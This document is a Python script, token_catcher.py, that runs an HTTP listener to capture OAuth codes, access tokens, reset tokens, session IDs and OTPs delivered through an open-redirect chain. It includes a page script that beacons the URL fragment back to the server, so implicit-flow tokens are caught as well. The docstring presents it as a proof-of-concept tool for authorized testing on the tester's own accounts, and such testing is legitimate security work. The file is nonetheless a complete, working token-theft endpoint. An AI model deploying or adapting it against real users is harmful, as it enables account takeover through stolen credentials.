#!/usr/bin/env python3
"""
token_catcher.py - benign marker-host listener for open-redirect PoCs.
A tiny local HTTP server that LOGS any OAuth code / access_token / reset token / fragment delivered to your
marker host by an open-redirect chain (OPEN_REDIRECT_TESTING_GUIDE.md sections 11/13). It only records what
arrives so you can PROVE the chain with your OWN account; it never uses or forwards the value.

Because a URL fragment (#access_token=...) is NOT sent to the server, the page also serves a 1x1 response with
a snippet that reports the fragment back via an image beacon to /_frag - so implicit-flow tokens are captured too.

Authorized testing only. Run this on a host YOU control; catch only your OWN test-account tokens. Take it down
after the PoC.

Usage:
  python3 token_catcher.py                 # listen on 0.0.0.0:8000
  python3 token_catcher.py --port 9000 --host 127.0.0.1
"""
import argparse, sys, datetime, urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

# cp1252-safe console on Windows
try:
    sys.stdout.reconfigure(encoding="utf-8")
except Exception:
    pass

SECRET_KEYS = ("code", "access_token", "id_token", "token", "refresh_token",
               "state", "session", "sid", "jsessionid", "reset", "reset_token", "otp")

# served so the browser reports back the #fragment (which never reaches the server on its own).
# The fragment is already in `key=val&key2=val2` form, so it is appended RAW to preserve that structure
# for the server's parse_qs (encodeURIComponent would collapse it into a single unparseable key).
FRAG_PAGE = (
    "<!doctype html><meta charset=utf-8><title>ok</title>"
    "<script>try{var f=location.hash.slice(1);if(f){new Image().src='/_frag?'+f;}}"
    "catch(e){}</script>"
    "<p>captured (authorized PoC) - close this tab.</p>"
)


def _flag(qs):
    found = [k for k in SECRET_KEYS if k in qs]
    return found


class Handler(BaseHTTPRequestHandler):
    def _log(self, tag, path, qs, extra=""):
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        found = _flag(qs)
        star = "  <== SECRET(S): " + ", ".join(found) if found else ""
        print(f"[{ts}] {tag} {path}{star}")
        for k, v in qs.items():
            val = v[0] if isinstance(v, list) else v
            mark = "  *" if k in SECRET_KEYS else ""
            print(f"         {k} = {val}{mark}")
        if extra:
            print(f"         {extra}")
        src = self.headers.get("Referer")
        if src:
            print(f"         Referer = {src}")
        sys.stdout.flush()

    def do_GET(self):
        parts = urllib.parse.urlsplit(self.path)
        qs = urllib.parse.parse_qs(parts.query, keep_blank_values=True)
        if parts.path == "/_frag":
            # fragment reported back by the beacon
            self._log("FRAGMENT", parts.path, qs, extra="(reported from location.hash)")
            self.send_response(200)
            self.send_header("Content-Type", "image/gif")
            self.end_headers()
            self.wfile.write(b"GIF89a")
            return
        self._log("GET ", parts.path, qs)
        body = FRAG_PAGE.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):
        length = int(self.headers.get("Content-Length") or 0)
        raw = self.rfile.read(length).decode("utf-8", "replace") if length else ""
        qs = urllib.parse.parse_qs(raw, keep_blank_values=True)
        parts = urllib.parse.urlsplit(self.path)
        self._log("POST", parts.path, qs, extra=f"body={raw[:200]}")
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, *args):
        pass  # silence default noisy logging; we print our own


def main():
    ap = argparse.ArgumentParser(description="Benign token/code catcher for open-redirect PoCs (authorized).")
    ap.add_argument("--host", default="0.0.0.0")
    ap.add_argument("--port", type=int, default=8000)
    a = ap.parse_args()

    print("== token_catcher (authorized PoC only) ==")
    print(f"listening on http://{a.host}:{a.port}/  (point your open-redirect / redirect_uri here)")
    print("logs any code/token/reset/state/session in the query, POST body, or #fragment.")
    print("catch only your OWN test-account tokens; take this down after the PoC.\n")
    srv = ThreadingHTTPServer((a.host, a.port), Handler)
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print("\nbye")


if __name__ == "__main__":
    main()
